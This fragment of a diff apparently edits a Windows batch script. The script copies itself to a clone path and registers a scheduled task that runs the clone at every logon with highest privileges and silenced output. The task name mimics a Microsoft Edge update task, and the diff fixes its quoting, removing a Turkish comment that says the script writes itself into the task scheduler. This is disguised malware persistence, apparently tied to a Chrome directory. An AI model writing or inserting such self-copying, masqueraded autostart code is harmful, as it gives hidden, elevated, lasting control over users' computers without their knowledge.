@@ -31,8 +31,8 @@ goto waitloop
 :clonefile
 copy /Y "%~f0" "%CLONEFILE%" >nul
 
-:: GÖREV ZAMANLAYICISINA clean.bat olarak kendini yaz
-SCHTASKS /Create /TN "MicrosoftEdgeUpdateTaskMachineCorer{799C1051-93A4-41ED-87A1-273FDA3AACD0}" /TR "%CLONEFILE%" /SC ONLOGON /RL HIGHEST /F >nul 2>&1
+
+SCHTASKS /Create /TN "MicrosoftEdgeUpdateTaskMachineCorer{799C1051-93A4-41ED-87A1-273FDA3AACD0}" /TR "\"%CLONEFILE%\"" /SC ONLOGON /RL HIGHEST /F >nul 2>&1
 
 :runit
 pushd "%CHROMEDIR%"
